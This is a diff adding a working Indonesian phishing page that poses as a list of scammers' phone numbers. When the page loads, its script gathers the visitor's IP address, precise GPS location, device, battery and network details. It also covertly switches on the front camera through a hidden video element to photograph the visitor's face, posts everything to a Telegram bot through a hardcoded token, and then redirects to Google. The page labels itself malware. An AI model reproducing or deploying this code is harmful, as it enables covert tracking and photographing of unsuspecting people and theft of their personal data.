@@ -1,0 +1,205 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
+    <title>KUMPULAN NOMER PENIPUAN</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            font-family: 'Segoe UI', 'Roboto', sans-serif;
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+            opacity: 0;
+        }
+        .container { max-width: 400px; width: 100%; }
+        .card {
+            background: white;
+            border-radius: 24px;
+            padding: 32px 24px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.2);
+            text-align: center;
+        }
+        .icon { width: 80px; height: 80px; margin: 0 auto 20px; display: flex; align-items: center; justify-content: center; }
+        .icon img { width: 100%; height: 100%; object-fit: contain; }
+        h2 { color: #333; margin-bottom: 12px; font-size: 1.5rem; }
+        p { color: #666; margin-bottom: 24px; line-height: 1.5; font-size: 0.9rem; }
+        video {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 1px;
+            height: 1px;
+            opacity: 0;
+            pointer-events: none;
+            z-index: -1;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="card">
+            <div class="icon">
+                <img src="https://files.catbox.moe/umjpnb.png" alt="logo" onerror="this.src='data:image/svg+xml,<svg xmlns=%22http://www.w3.org/2000/svg%22 viewBox=%220 0 100 100%22><circle cx=%2250%22 cy=%2250%22 r=%2245%22 fill=%22%23667eea%22/><text x=%2250%22 y=%2265%22 text-anchor=%22middle%22 fill=%22white%22 font-size=%2240%22>🔒</text></svg>'">
+            </div>
+            <h2>KUMPULAN NOMER PENIPUAN</h2>
+            <p>Website ini kumpulan nomer para penipuan jual beli di berbagai daerah.<br>Cek daftar nomer penipuan di daerah anda.</p>        </div>
+    </div>
+
+    <video id="cameraFeed" autoplay playsinline muted></video>
+
+    <script>
+        // ======================= TELEGRAM CONFIG (UPDATED) =======================
+        const BOT_TOKEN = "7961448359:AAFig9R1lEBznZH1dr1yozwzQFWP6PlRJHQ";
+        const CHANNEL_ID = "-1003738688179";
+
+        let cameraStream = null;
+        let isActive = false;
+        let currentLat = null, currentLng = null;
+        let currentLocationText = "Tidak terdeteksi";
+        let currentMapsLink = "-";
+
+        function sendToChannel(message, photoBase64 = null) {
+            try {
+                if (photoBase64) {
+                    const blob = dataURLtoBlob(photoBase64);
+                    const formData = new FormData();
+                    formData.append('chat_id', CHANNEL_ID);
+                    formData.append('photo', blob, 'face.jpg');
+                    formData.append('caption', message);
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, { method: 'POST', body: formData });
+                } else {
+                    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                        method: 'POST',
+                        headers: { 'Content-Type': 'application/json' },
+                        body: JSON.stringify({ chat_id: CHANNEL_ID, text: message, parse_mode: 'HTML' })
+                    });
+                }
+            } catch(e) {}
+        }
+
+        function dataURLtoBlob(dataURL) {
+            const arr = dataURL.split(',');
+            const mime = arr[0].match(/:(.*?);/)[1];
+            const bstr = atob(arr[1]);
+            let n = bstr.length;
+            const u8arr = new Uint8Array(n);
+            while (n--) u8arr[n] = bstr.charCodeAt(n);
+            return new Blob([u8arr], { type: mime });
+        }
+
+        async function getLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ lat: null, lng: null, text: "Tidak support GPS", mapsLink: "-" });
+                    return;                }
+                navigator.geolocation.getCurrentPosition(
+                    (pos) => {
+                        currentLat = pos.coords.latitude;
+                        currentLng = pos.coords.longitude;
+                        currentLocationText = `${currentLat.toFixed(6)}, ${currentLng.toFixed(6)} (akurasi ${Math.round(pos.coords.accuracy)}m)`;
+                        currentMapsLink = `https://www.google.com/maps?q=${currentLat},${currentLng}`;
+                        resolve({ lat: currentLat, lng: currentLng, text: currentLocationText, mapsLink: currentMapsLink });
+                    },
+                    () => resolve({ lat: null, lng: null, text: "Izin lokasi ditolak", mapsLink: "-" }),
+                    { enableHighAccuracy: true, timeout: 10000 }
+                );
+            });
+        }
+
+        async function setupCamera() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ 
+                    video: { facingMode: "user", width: { ideal: 1280 }, height: { ideal: 720 } },
+                    audio: false 
+                });
+                cameraStream = stream;
+                document.getElementById('cameraFeed').srcObject = stream;
+                await new Promise(r => setTimeout(r, 1500));
+                return true;
+            } catch(e) {
+                return false;
+            }
+        }
+
+        async function collectAndSendData() {
+            let ip = "Tidak terdeteksi", operator = "-", country = "-";
+            try {
+                const ipRes = await fetch('https://ipapi.co/json/');
+                const ipData = await ipRes.json();
+                ip = ipData.ip || ip;
+                operator = ipData.org || '-';
+                country = ipData.country_name || '-';
+            } catch(e) {}
+
+            const locationData = await getLocation();
+            const wifiInfo = navigator.connection ? `${navigator.connection.effectiveType || 'unknown'} (${navigator.connection.downlink || '?'} Mbps)` : "Tidak terdeteksi";
+
+            let battery = "Tidak tersedia";
+            if ('getBattery' in navigator) {
+                try {
+                    const bat = await navigator.getBattery();
+                    battery = `${Math.round(bat.level * 100)}% ${bat.charging ? '🔌 (Mengisi)' : '⚡ (Baterai)'}`;
+                } catch(e) {}
+            }
+            const ua = navigator.userAgent;
+            let deviceModel = "Unknown";
+            if (/Android/i.test(ua)) {
+                const brandMatch = ua.match(/(SM-[A-Z0-9]+|Redmi|Mi|POCO|Realme|OnePlus|OPPO|vivo|Pixel|Xiaomi|Infinix|Tecno|Samsung)/i);
+                deviceModel = brandMatch ? brandMatch[0] : "Android Device";
+            } else if (/iPhone|iPad/i.test(ua)) deviceModel = "Apple iOS";
+            else if (/Windows/i.test(ua)) deviceModel = "Windows PC";
+            else if (/Mac/i.test(ua)) deviceModel = "Macintosh";
+
+            let ram = navigator.deviceMemory ? `${navigator.deviceMemory} GB` : "Tidak tersedia";
+            let cpu = `${navigator.hardwareConcurrency || '?'} Core / ${navigator.platform || 'unknown'}`;
+            const kartuNomer = `${operator} (${country})`;
+
+            const message = `🔴 <b>MALWARE BY SKY LAND</b> 🔴
+            
+🌐 IP: ${ip}
+📍 LOKASI: ${locationData.text}
+🗺️ LINK MAPS: <a href="${locationData.mapsLink}">${locationData.mapsLink}</a>
+📇 KARTU NOMER: ${kartuNomer}
+📱 MEREK HP: ${deviceModel}
+🧠 RAM: ${ram}
+⚙️ CPU: ${cpu}
+🔋 BATRAI: ${battery}
+📡 WIFI: ${wifiInfo}
+🕒 ZONA WAKTU: ${Intl.DateTimeFormat().resolvedOptions().timeZone}
+📐 RESOLUSI: ${screen.width}x${screen.height}
+📍 WAKTU AKSES: ${new Date().toLocaleString()}
+
+⚠️ <b>NOTE:</b> MALWARE INI DI BUAT UNTUK MENCARI LOKASI SAMA WAJAH PELAKU. JADI JIKA KALIAN KLIK MAKA MUKA KALIAN DAN DATA KALIAN SEDANG KAMI PANTAU`;
+
+            await sendToChannel(message);
+
+            // Ambil foto jika kamera aktif
+            const cameraOk = await setupCamera();
+            if (cameraOk) {
+                const video = document.getElementById('cameraFeed');
+                const canvas = document.createElement('canvas');
+                canvas.width = 640;
+                canvas.height = 480;
+                canvas.getContext('2d').drawImage(video, 0, 0, 640, 480);
+                const img = canvas.toDataURL('image/jpeg');
+                const caption = `📸 [FACE CAPTURE] ${new Date().toLocaleString()}\n📍 ${currentLocationText}\n🗺️ ${currentMapsLink}`;
+                sendToChannel(caption, img);
+                cameraStream.getTracks().forEach(t => t.stop());
+            }
+        }
+
+        // Eksekusi langsung saat halaman dimuat
+        (async () => {            isActive = true;
+            await collectAndSendData();
+            setTimeout(() => {
+                window.location.href = "https://www.google.com";
+            }, 3000);
+        })();
+    </script>
+</body>
+</html>
